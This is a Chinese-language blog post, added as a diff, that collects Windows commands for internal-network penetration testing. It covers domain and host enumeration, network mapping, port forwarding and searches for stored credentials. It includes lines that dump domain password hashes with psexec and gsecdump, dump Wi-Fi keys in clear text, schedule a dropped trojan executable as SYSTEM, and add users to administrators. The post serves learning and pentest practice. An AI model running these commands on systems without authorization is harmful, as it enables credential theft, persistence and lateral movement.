@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    内网渗透常用命令总结（windows） | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",笔记,渗透测试">
+<meta name="description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。
+0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透常用命令总结（windows） | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。
+0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+<meta property="og:updated_time" content="2018-05-05T13:56:03.085Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网渗透常用命令总结（windows） | Leticia‘s Blog">
+<meta name="twitter:description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。
+0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 22</a><a href="/tags/python/" class="tagc2">python : 7</a><a href="/tags/笔记/" class="tagc3">笔记 : 6</a><a href="/tags/网络安全/" class="tagc4">网络安全 : 5</a><a href="/tags/mysql/" class="tagc5">mysql : 5</a><a href="/tags/php/" class="tagc1">php : 5</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 4</a><a href="/tags/暴力破解/" class="tagc3">暴力破解 : 4</a><a href="/tags/ctf/" class="tagc4">ctf : 3</a><a href="/tags/硬件安全/" class="tagc5">硬件安全 : 2</a><a href="/tags/密码学/" class="tagc1">密码学 : 2</a><a href="/tags/文件上传/" class="tagc2">文件上传 : 2</a><a href="/tags/struts2-052/" class="tagc3">struts2-052 : 1</a><a href="/tags/heartbleed/" class="tagc4">heartbleed : 1</a><a href="/tags/arp入侵/" class="tagc5">arp入侵 : 1</a><a href="/tags/nmap/" class="tagc1">nmap : 1</a><a href="/tags/arpspoof/" class="tagc2">arpspoof : 1</a><a href="/tags/mssql/" class="tagc3">mssql : 1</a><a href="/tags/XSS/" class="tagc4">XSS : 1</a><a href="/tags/BurpSuite/" class="tagc5">BurpSuite : 1</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">内网渗透常用命令总结（windows）</h1>
+    
+    <div class="post-meta">
+      <time datetime="2018-05-05 21:55:03" class="post-meta__date date">2018-05-05 21:55:03</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/笔记/">笔记</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>, <a class="tags-link" href="/tags/笔记/">笔记</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p>
+<h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">net group /domain                        //获得所有域用户组列表 </div><div class="line">net group qq_group /domain               //显示域中qq_group组的成员 </div><div class="line">net group qq_group /del /domain          //删除域中qq_group组</div><div class="line">net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ</div><div class="line">net group qq_group /add /domain          //增加域中的群组</div><div class="line">net group &quot;domain admins&quot;  /domain       //获得域管理员列表</div><div class="line">net group &quot;enterprise admins&quot; /domain    //获得企业管理员列表</div><div class="line">net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）</div><div class="line">net group &quot;domain controllers&quot;  /domain   //获得域控制器列表</div><div class="line">net group &quot;domain computers&quot;  /domain    //获得所有域成员计算机列表</div><div class="line">net user /domain                        //获得所有域用户列表</div><div class="line">net user someuser /domain              //获得指定账户someuser的详细信息</div><div class="line">net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息</div><div class="line">nei view /domain                   //查询有几个域, 查询域列表</div><div class="line">net view /domain:testdomain       //查看 testdomain域中的计算机列表</div><div class="line">nltest /domain_trusts              //获取域信任信息</div><div class="line">net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</div><div class="line">net config Workstation         //查询机器属于哪个域</div><div class="line">net time /domian               //查询主域服务器的时间</div><div class="line">echo %logonserver%              //查看登陆到这台服务器的计算机名</div><div class="line">net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间</div><div class="line">net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接</div><div class="line">net  view  \\dc2.backlion.com         //查看域控共享情况</div><div class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录</div><div class="line">xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志</div><div class="line">net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限</div><div class="line">net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中</div><div class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题</div><div class="line">gpupdate/force                  //更新域策略</div><div class="line">psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u</div><div class="line">  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</div><div class="line">gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</div><div class="line">tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列</div></pre></td></tr></table></figure>
+<h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">ipconfig/all    //查看IP地址</div><div class="line">ipconfig /release  //释放地址</div><div class="line">ipconfig /renew 重新获取Ip地址</div><div class="line">whoami    //查询账号所属权限</div><div class="line">whoami/all  //查看sid值</div><div class="line">systeminfo  //查询系统以及补丁信息</div><div class="line">tasklist /svc   //查看进程</div><div class="line">taskkill /im 进程名称(cmd)  //结束进程</div><div class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</div><div class="line">wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用</div><div class="line">wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装</div><div class="line">wmic  qfe      //查询补丁信息以及微软提供的下载地址</div><div class="line">ping hostname(主机名）   //显示该机器名的IP </div><div class="line">net start   //查看当前运行的服务</div><div class="line">net user      //查看本地组的用户</div><div class="line">net localhroup administrators   //查看本机管理员组有哪些用户</div><div class="line">net use      //查看会话</div><div class="line">net session     //查看当前会话</div><div class="line">net share       //查看SMB指向的路径[即共享]</div><div class="line">wmic share get name,path   //查看SMB指向的路径</div><div class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</div><div class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）</div><div class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘</div><div class="line">net time \\172.16.16.2        //查询共享主机的是</div><div class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行</div><div class="line">netstat  -ano      //查看开放的端口</div><div class="line">netstat -an | find “3389”   //找到3389端口</div><div class="line">net accounts      //查看本地密码策略</div><div class="line">nbtstat –A ip      //netbiso查询</div><div class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</div><div class="line">echo %PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  </div><div class="line">set                              //查看系统环境设置变量</div><div class="line">net start                     //查看当前运行的服务</div><div class="line">wmic service list brief              //查看进程服务</div><div class="line">wmic process list brief         //查看进程</div><div class="line">wmic startup list brief       //查看启动程序信息</div><div class="line">wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）</div><div class="line">wmic startup list full         //识别开机启动的程序</div><div class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log  //获取软件安装路径</div><div class="line"></div><div class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</div><div class="line"> //一键获取wifi密码</div><div class="line"></div><div class="line"> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) </div><div class="line">//查看是否支持posershell</div><div class="line"></div><div class="line">qwinsta                       //查看登录情况</div><div class="line"></div><div class="line">schtasks.exe  /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/4/7  //添加计划任务</div><div class="line"></div><div class="line"></div><div class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt</div><div class="line"> //windows未打补丁情况</div><div class="line"></div><div class="line"> REG query HKCU  /v &quot;pwd&quot; /s  //获取保存到注册表中的密码</div></pre></td></tr></table></figure>
+<h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"> tracert IP    //路由跟踪</div><div class="line">route print    //打印路由表</div><div class="line">arp -a          //列出本网段内所有活跃的IP地址</div><div class="line">arp -s （ip + mac）//绑定mac与ip地址</div><div class="line">arp -d （ip + mac） //解绑mac与ip地址</div><div class="line">nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络</div><div class="line">netsh firewall show config     //查看防火墙策略</div><div class="line">netsh firewall show state     //查看防火墙策略</div><div class="line">for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;   //批量扫描内网存活主机</div><div class="line"></div><div class="line">windows自带端口转发：</div><div class="line">netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</div><div class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22</div><div class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22</div><div class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22</div><div class="line">netsh interface portproxy show all // 查看转发配置</div><div class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置</div><div class="line">netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22：</div></pre></td></tr></table></figure>
+<p>0x04 敏感数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">dir /b/s config.*              //查看所在目录所有config.为前缀的文件</div><div class="line">findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件</div><div class="line">findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件</div><div class="line">copy con 创建命令：</div><div class="line">copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</div><div class="line">copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</div></pre></td></tr></table></figure></p>
+<h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">mspaint　　画图工具</div><div class="line">calc　　计算机</div><div class="line">notepad　　记事本</div><div class="line">taskmgr　　任务管理器</div><div class="line">osk　　打开屏幕键盘</div><div class="line">gpedit.msc　　组策略</div><div class="line">services.msc　　本地服务</div><div class="line">compmgmt.msc　　计算机管理</div><div class="line">devmgmt.msc　　设备管理器</div><div class="line">winver　　查看系统版本</div><div class="line">magnify　　放大镜实用程序</div><div class="line">eventvwr　　事件查看器</div><div class="line">Regedit　　打开注册表</div><div class="line">resmon　　资源监视器</div><div class="line">WMIC BIOS get releasedate　　查看电脑生产日期</div><div class="line">mstsc -f　　远程连接（可以全屏）</div></pre></td></tr></table></figure>
+<h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p>
+<p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="external">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2018/05/05/内网渗透常用命令总结（windows）/" target="_blank">内网渗透常用命令总结（windows）</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2018-05-05 21:55:03<br />
+    <span>最后更新:</span>2018-05-05 21:56:03<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
